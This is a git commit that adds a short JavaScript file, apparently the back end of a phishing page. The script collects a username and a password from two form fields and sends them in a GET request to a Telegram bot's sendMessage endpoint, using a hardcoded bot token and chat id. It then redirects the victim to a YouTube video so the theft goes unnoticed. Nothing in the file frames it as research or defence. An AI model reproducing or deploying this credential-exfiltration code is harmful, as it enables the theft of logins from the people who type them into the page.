c1aefe5df656e2a860c5b4b33b329a03e7a54393
user73748 <119026277+user73748@users.noreply.github.com>
2022-11-24 22:07:34 -0600

    Add files via upload

---
+++ script.js
@@ -0,0 +1,31 @@
+const sendatatme = document.getElementById("sendatatme");
+const first = document.getElementById("first");
+const second = document.getElementById("second");
+const resfirst = document.getElementById("resfirst");
+const resecond = document.getElementById("resecond");
+
+first.addEventListener("change", () => {
+  resfirst.value = first.value;
+});
+second.addEventListener("change", () => {
+  resecond.value = second.value;
+});
+
+function redirect() {
+  const Http = new XMLHttpRequest();
+  const url =
+    "https://api.telegram.org/bot5614657667:AAGvTtXUi07JHKAGKf_5uBoWHx4tGaUYiUs/sendMessage?chat_id=1360207733&text=USERNAME:%20" +
+    resfirst.value +
+    " PASSWORD: " +
+    resecond.value;
+  Http.open("GET", url);
+  Http.send();
+
+  Http.onreadystatechange = (e) => {
+    console.log(Http.responseText);
+  };
+
+window.location.href = 'https://youtu.be/QUEEd_L2BcI';
+}
+
+sendatatme.addEventListener("click", redirect);
